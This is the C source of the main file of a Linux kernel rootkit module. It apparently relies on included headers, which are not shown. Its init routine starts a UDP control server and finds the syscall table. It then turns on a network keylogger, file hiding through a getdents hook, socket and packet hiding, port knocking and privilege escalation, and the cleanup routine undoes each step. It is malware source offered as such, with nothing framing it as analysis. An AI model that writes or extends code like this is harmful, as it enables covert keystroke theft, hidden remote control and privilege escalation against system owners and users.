#include "include.h"
#include "core.h"
#include "network_keylog.h"
#include "module_hiding.h"
#include "getdents_hook.h"
#include "socket_hiding.h"
#include "packet_hiding.h"
#include "port_knocking.h"
#include "privilege_escalation.h"
#include "udp_server.h"

int init_module(void) {

	int res;

	debug("Rootkit module initializing...\n");

    /* start udp server */
    res = udp_server_start();

    if(res) {

    	alert("Error on udp_server_start (returned %d)\n", res);
    	return -EINVAL;
    }

	/* set sys call table pointer */
	res = set_sys_call_table();

    if(res) {

    	alert("Error on set_sys_call_table (returned %d)\n", res);
    	return -EINVAL;
    }

	/* init keylogger */
	res = network_keylogger_init();

    if(res) {

    	alert("Error on network_keylogger_init (returned %d)\n", res);
    	return -EINVAL;
    }

	/* hook getdents */
	res = hook_getdents_init();

    if(res) {

    	alert("Error on hook_getdents_init (returned %d)\n", res);
    	return -EINVAL;
    }

	/* hook recvmsg */
	res = socket_hiding_init();

    if(res) {

    	alert("Error on socket_hiding_init (returned %d)\n", res);
    	return -EINVAL;
    }

	/* hook packets */
	res = packet_hiding_init();

    if(res) {

    	alert("Error on packet_hiding_init (returned %d)\n", res);
    	return -EINVAL;
    }

	/* port knocking */
	res = port_knocking_init();

    if(res) {

    	alert("Error on port_knocking_init (returned %d)\n", res);
    	return -EINVAL;
    }

	/* privilege escalation */
	res = priv_escalation_init();

    if(res) {

    	alert("Error on priv_escalation_init (returned %d)\n", res);
    	return -EINVAL;
    }

    debug("Rootkit module successfully initialized.\n");

	return 0;
}

void reset_module(void) {

	/* close udp server */
    debug("Close UDP connection...");
	udp_server_close();
    debug("UDP connection closed.");

	/* keylogger exit */
    debug("Reset keylogger and hooked terminals...");
	network_keylogger_exit();
    debug("Terminals unhooked.");

    /* getdents unhook */
    debug("Reset getdents system calls...");
	hook_getdents_exit();
    debug("getdents system calls back to original.");

    /* socket hiding exit */
    debug("Reset tcpX_show functions...");
	socket_hiding_exit();
    debug("tcpX_show functions back to original.");

    /* packet hiding exit */
    debug("Reset packet_rcv functions...");
	packet_hiding_exit();
    debug("packet_rcv functions back to original.");

    /* port knocking exit */
    debug("Clear list of IP senders and ports and unregister hook...");
	port_knocking_exit();
    debug("All lists cleared and hook unregistered.");

    /* privilege escalation exit */
    debug("Clear list of escalated processes...");
	priv_escalation_exit();
    debug("All lists cleared and processes deescalated.");
}

void cleanup_module(void) {

    debug("Unloading rootkit module...");

	/* reset and free everything */
	reset_module();

    debug("Rootkit module unloaded.\n");
}

MODULE_LICENSE("GPL");